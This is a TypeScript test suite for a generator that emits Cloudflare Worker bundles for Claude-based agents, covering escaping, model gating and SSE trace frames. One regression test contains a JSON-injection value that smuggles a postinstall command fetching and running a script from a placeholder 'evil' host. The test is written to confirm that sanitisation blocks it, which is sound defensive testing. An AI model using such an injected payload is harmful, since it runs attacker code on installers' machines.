import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { IrV0 } from "@crewhaus/ir";
import { TargetEmitError, emitCfWorkerCli } from "./index";

/**
 * SSE-frame test harness (Batch C, item 3). These helpers EXECUTE the emitted
 * worker in-process against a stubbed Anthropic endpoint and collect the SSE
 * frames the worker's `/chat` returns, so the tests pin the real wire bytes —
 * not just substrings of the generated source.
 */
type SseEvent = { readonly name: string; readonly data: Record<string, unknown> };

/** A canned Anthropic streaming SSE body carrying deterministic token usage. */
function anthropicStreamBody(opts: {
  input: number;
  output: number;
  text: string;
  stopReason: string;
}): ReadableStream<Uint8Array> {
  const frames = [
    `event: message_start\ndata: ${JSON.stringify({
      type: "message_start",
      message: {
        usage: { input_tokens: opts.input, output_tokens: 1, cache_read_input_tokens: 0 },
      },
    })}\n\n`,
    `event: content_block_delta\ndata: ${JSON.stringify({
      type: "content_block_delta",
      delta: { type: "text_delta", text: opts.text },
    })}\n\n`,
    `event: message_delta\ndata: ${JSON.stringify({
      type: "message_delta",
      delta: { stop_reason: opts.stopReason },
      usage: { output_tokens: opts.output },
    })}\n\n`,
    "event: message_stop\ndata: {}\n\n",
  ];
  const enc = new TextEncoder();
  return new ReadableStream({
    start(controller) {
      for (const f of frames) controller.enqueue(enc.encode(f));
      controller.close();
    },
  });
}

/** Import the generated worker.js as a module (unique path defeats import caching). */
async function loadWorker(code: string): Promise<{
  fetch: (req: Request, env: Record<string, string>) => Promise<Response>;
}> {
  const dir = mkdtempSync(join(tmpdir(), "cfw-cli-"));
  const file = join(dir, "worker.mjs");
  writeFileSync(file, code);
  const mod = (await import(file)).default;
  rmSync(dir, { recursive: true, force: true });
  return mod;
}

/** Drive the worker's `/chat` and collect every SSE frame it returns. */
async function driveChat(code: string): Promise<SseEvent[]> {
  const worker = await loadWorker(code);
  const req = new Request("https://harness.example/chat", {
    method: "POST",
    headers: { "content-type": "application/json", origin: "https://studio.crewhaus.ai" },
    body: JSON.stringify({ messages: [{ role: "user", content: "hi" }] }),
  });
  const res = await worker.fetch(req, { ANTHROPIC_API_KEY: "sk-test" });
  const reader = res.body?.getReader();
  if (!reader) throw new Error("no response body");
  const dec = new TextDecoder();
  let buffer = "";
  const out: SseEvent[] = [];
  for (;;) {
    const { value, done } = await reader.read();
    if (done) break;
    buffer += dec.decode(value, { stream: true });
    let sep = buffer.indexOf("\n\n");
    while (sep !== -1) {
      const raw = buffer.slice(0, sep);
      buffer = buffer.slice(sep + 2);
      let name = "message";
      let data = "";
      for (const line of raw.split("\n")) {
        if (line.startsWith("event: ")) name = line.slice(7);
        else if (line.startsWith("data: ")) data += line.slice(6);
      }
      if (data) out.push({ name, data: JSON.parse(data) as Record<string, unknown> });
      sep = buffer.indexOf("\n\n");
    }
  }
  return out;
}

const baseIr: IrV0 = {
  version: 0,
  name: "hello-cli",
  target: "cli",
  agent: {
    model: "claude-haiku-4-5-20251001",
    instructions: "You are a helpful assistant.",
  },
  tools: [],
  toolConfigs: Object.freeze({}),
  mcp_servers: Object.freeze({}),
  permissions: { rules: [] },
  subAgents: [],
  compaction: {},
};

describe("emitCfWorkerCli", () => {
  test("emits worker.js, wrangler.toml, package.json, and the generated README (item 42)", () => {
    const bundle = emitCfWorkerCli(baseIr);
    const paths = bundle.files.map((f) => f.path).sort();
    expect(paths).toEqual(["README.md", "package.json", "worker.js", "wrangler.toml"]);
    // The Worker README substitutes the wrangler flow for the local run snippet.
    const readme = bundle.files.find((f) => f.path === "README.md")?.content ?? "";
    expect(readme).toContain("wrangler deploy");
    expect(readme).not.toContain("bun agent.ts");
  });

  test("readme: false restores the three-file bundle (item 42 opt-out)", () => {
    const bundle = emitCfWorkerCli(baseIr, { readme: false });
    expect(bundle.files.map((f) => f.path).sort()).toEqual([
      "package.json",
      "worker.js",
      "wrangler.toml",
    ]);
  });

  test("worker.js inlines model and instructions", () => {
    const bundle = emitCfWorkerCli(baseIr);
    const worker = bundle.files.find((f) => f.path === "worker.js");
    expect(worker?.content).toContain("claude-haiku-4-5-20251001");
    expect(worker?.content).toContain("You are a helpful assistant.");
    expect(worker?.content).toContain("api.anthropic.com");
  });

  test("wrangler.toml uses sanitized spec name", () => {
    const ir: IrV0 = { ...baseIr, name: "Hello World!" };
    const bundle = emitCfWorkerCli(ir);
    const wrangler = bundle.files.find((f) => f.path === "wrangler.toml");
    expect(wrangler?.content).toContain('name = "hello-world-"');
  });

  // Regression — issue #148 (CWE-94). A raw ir.name in the package.json name
  // field could break out of the JSON string and inject a postinstall script.
  test("package.json sanitizes the spec name and resists JSON injection", () => {
    const ir: IrV0 = {
      ...baseIr,
      name: '", "scripts": { "postinstall": "curl http://evil/c2 | sh" }, "x": "',
    };
    const pkg = emitCfWorkerCli(ir).files.find((f) => f.path === "package.json");
    expect(pkg).toBeDefined();
    const parsed = JSON.parse(pkg?.content ?? "") as {
      name: string;
      scripts: Record<string, string>;
    };
    expect(parsed.name).not.toContain('"'); // sanitized to [a-z0-9-]
    expect(parsed.scripts["postinstall"]).toBeUndefined(); // injection did not break out
    expect(parsed.scripts).toEqual({ deploy: "wrangler deploy", dev: "wrangler dev --local" });
  });

  test("worker.js escapes special characters in instructions", () => {
    const ir: IrV0 = {
      ...baseIr,
      agent: {
        ...baseIr.agent,
        instructions: 'Respond with "quoted" text\nand newlines.',
      },
    };
    const bundle = emitCfWorkerCli(ir);
    const worker = bundle.files.find((f) => f.path === "worker.js");
    expect(worker?.content).toContain('\\"quoted\\"');
    expect(worker?.content).toContain("\\n");
  });

  test("rejects non-cli IR variants", () => {
    const wrong = { ...baseIr, target: "workflow" } as unknown as IrV0;
    expect(() => emitCfWorkerCli(wrong)).toThrow(TargetEmitError);
  });

  test("rejects CLI IR with tools until M2", () => {
    const ir: IrV0 = { ...baseIr, tools: ["read", "write"] };
    expect(() => emitCfWorkerCli(ir)).toThrow(TargetEmitError);
  });

  // Regression: the emitter previously wrapped JSON.stringify output in an
  // extra pair of quotes (`name: ""hello-cli""`), which Cloudflare rejected
  // at upload with "Unexpected identifier 'hello' at worker.js:5:10". The
  // substring assertions above missed it, so parse the whole module instead.
  const parseJs = (code: string) => new Bun.Transpiler({ loader: "js" }).transformSync(code);

  test("worker.js is syntactically valid JavaScript", () => {
    const worker = emitCfWorkerCli(baseIr).files.find((f) => f.path === "worker.js");
    expect(() => parseJs(worker?.content ?? "")).not.toThrow();
  });

  test("worker.js stays valid with hyphenated name and tricky instructions", () => {
    const ir: IrV0 = {
      ...baseIr,
      name: "hello-cli",
      agent: {
        ...baseIr.agent,
        instructions: 'Quotes "here", a newline\nhere, a ${dollar} and a ` backtick.',
      },
    };
    const worker = emitCfWorkerCli(ir).files.find((f) => f.path === "worker.js");
    expect(() => parseJs(worker?.content ?? "")).not.toThrow();
  });
});

describe("emitCfWorkerCli — provider gate", () => {
  test("an openai/ spec fails at compile time with the cf-worker hint", () => {
    const ir: IrV0 = {
      ...baseIr,
      agent: { ...baseIr.agent, model: "openai/gpt-4o-mini" },
    };
    expect(() => emitCfWorkerCli(ir)).toThrow(TargetEmitError);
    expect(() => emitCfWorkerCli(ir)).toThrow(
      /cf-worker targets currently support claude-\* models only — use the cli target for other providers/,
    );
    expect(() => emitCfWorkerCli(ir)).toThrow(/openai/);
  });

  test("gemini/, bedrock/, and local/ specs are all rejected", () => {
    for (const model of [
      "gemini/gemini-2.5-flash",
      "bedrock/us.anthropic.claude-sonnet-4-5-20250929-v1:0",
      "local/llama3.2@http://localhost:11434/v1",
    ]) {
      const ir: IrV0 = { ...baseIr, agent: { ...baseIr.agent, model } };
      expect(() => emitCfWorkerCli(ir)).toThrow(TargetEmitError);
    }
  });

  test("an unparseable model string surfaces as TargetEmitError, not a raw ConfigError", () => {
    const ir: IrV0 = { ...baseIr, agent: { ...baseIr.agent, model: "gpt-4o-mini" } };
    expect(() => emitCfWorkerCli(ir)).toThrow(TargetEmitError);
    expect(() => emitCfWorkerCli(ir)).toThrow(/unrecognised model string/);
  });

  test("claude-* models still emit cleanly", () => {
    expect(emitCfWorkerCli(baseIr).files.length).toBe(4);
  });
});

describe("emitCfWorkerCli — failure_taxonomy ignored-note (item 23)", () => {
  test("worker.js carries the ignored-taxonomy note when the spec declares one", () => {
    const ir: IrV0 = {
      ...baseIr,
      failureTaxonomy: [{ class: "rate_limited", pattern: "/429/", recovery: "retry" }],
    };
    const code = emitCfWorkerCli(ir).files[0]?.content ?? "";
    expect(code).toContain(
      "failure_taxonomy configured but target-cf-worker-cli does not yet wire it up",
    );
  });

  test("no note when the spec omits failure_taxonomy", () => {
    expect(emitCfWorkerCli(baseIr).files[0]?.content ?? "").not.toContain(
      "failure_taxonomy configured",
    );
  });
});

describe("emitCfWorkerCli — trace SSE frames (Batch C, item 3)", () => {
  const realFetch = globalThis.fetch;
  beforeEach(() => {
    // Stub the Anthropic endpoint the generated worker calls with a canned
    // streaming body carrying deterministic usage (10 in / 5 out).
    globalThis.fetch = (async () =>
      new Response(
        anthropicStreamBody({ input: 10, output: 5, text: "Hello", stopReason: "end_turn" }),
        {
          status: 200,
          headers: { "content-type": "text/event-stream" },
        },
      )) as unknown as typeof fetch;
  });
  afterEach(() => {
    globalThis.fetch = realFetch;
  });

  const workerCode = (ir: IrV0) =>
    emitCfWorkerCli(ir).files.find((f) => f.path === "worker.js")?.content ?? "";

  test("emits model_response + cost_accrual trace frames, then a byte-compatible done", async () => {
    const events = await driveChat(workerCode(baseIr));
    // text/done/error stay exactly as before — chat.ts consumes these unchanged.
    const text = events.filter((e) => e.name === "text");
    expect(text.map((e) => e.data["text"]).join("")).toBe("Hello");
    const done = events.find((e) => e.name === "done");
    expect(done?.data).toEqual({ text: "Hello", stopReason: "end_turn" });

    // The new trace frames carry the TraceEvent vocabulary.
    const traces = events.filter((e) => e.name === "trace");
    const kinds = traces.map((e) => e.data["kind"]);
    expect(kinds).toEqual(["model_response", "cost_accrual"]);

    const resp = traces[0]?.data as {
      model: string;
      usage: Record<string, number>;
      stopReason: string;
    };
    expect(resp.model).toBe("claude-haiku-4-5-20251001");
    expect(resp.usage.input).toBe(10);
    expect(resp.usage.output).toBe(5);
    expect(resp.stopReason).toBe("end_turn");

    const cost = traces[1]?.data as Record<string, unknown>;
    expect(cost).toMatchObject({
      kind: "cost_accrual",
      provider: "anthropic",
      modelId: "claude-haiku-4-5-20251001",
      inputTokens: 10,
      outputTokens: 5,
      costUsdMicros: 0,
      unpriced: true,
    });
  });

  test("model_response precedes done so the studio host sees usage before the terminal", async () => {
    const events = await driveChat(workerCode(baseIr));
    const doneIdx = events.findIndex((e) => e.name === "done");
    const respIdx = events.findIndex(
      (e) => e.name === "trace" && e.data["kind"] === "model_response",
    );
    expect(respIdx).toBeGreaterThanOrEqual(0);
    expect(respIdx).toBeLessThan(doneIdx);
  });

  test("observability.trace: off emits NO trace frames (text/done still flow)", async () => {
    const ir: IrV0 = { ...baseIr, observability: { trace: { level: "off" } } };
    const code = workerCode(ir);
    expect(code).toContain("trace: false");
    const events = await driveChat(code);
    expect(events.some((e) => e.name === "trace")).toBe(false);
    expect(events.find((e) => e.name === "done")?.data).toEqual({
      text: "Hello",
      stopReason: "end_turn",
    });
  });

  test("observability.trace: pretty (and the default absence) bake trace ON", () => {
    expect(workerCode(baseIr)).toContain("trace: true");
    expect(workerCode({ ...baseIr, observability: { trace: { level: "pretty" } } })).toContain(
      "trace: true",
    );
    expect(workerCode({ ...baseIr, observability: {} })).toContain("trace: true");
  });
});
